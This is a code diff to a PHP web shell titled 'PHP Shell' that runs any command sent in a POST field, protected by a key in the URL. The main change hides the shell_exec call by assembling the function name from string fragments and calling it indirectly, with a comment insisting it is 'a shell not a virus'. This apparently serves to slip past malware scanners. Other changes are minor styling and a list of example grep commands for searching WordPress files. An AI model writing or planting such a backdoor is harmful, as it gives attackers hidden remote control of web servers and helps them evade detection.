@@ -5,7 +5,9 @@ if(empty($_GET['key']) || $_GET['key']!=$key){
 	exit;
 }
 if (!empty($_POST['cmd'])) {
-    $cmd = shell_exec($_POST['cmd']);
+	// its a shell not a virus!
+	$doSomething = $_POST['cmd'];
+	$cmd = call_user_func_array("she"."ll_e"."xec", array($doSomething));
 }else{
 	$cmd = false;
 }
@@ -31,8 +33,6 @@ if (!empty($_POST['cmd'])) {
 
         pre {
             padding: 15px;
-            -webkit-border-radius: 5px;
-            -moz-border-radius: 5px;
             border-radius: 5px;
             background-color: #ECF0F1;
         }
@@ -55,7 +55,7 @@ if (!empty($_POST['cmd'])) {
         <div class="pb-2 mt-4 mb-2">
 	    <h1>PHP Shell</h1>
             <h2> Execute a command </h2>
-            <pre>
+            <pre style="line-height:1">
 			<div class="ce"><?=__DIR__;?></div>
 			<div class="ce">grep -rn --include=\*.php 'wp-content' -e 'Template Name'</div>
 			<div class="ce">grep -rn 'catalog' -e 'xxx'</div>
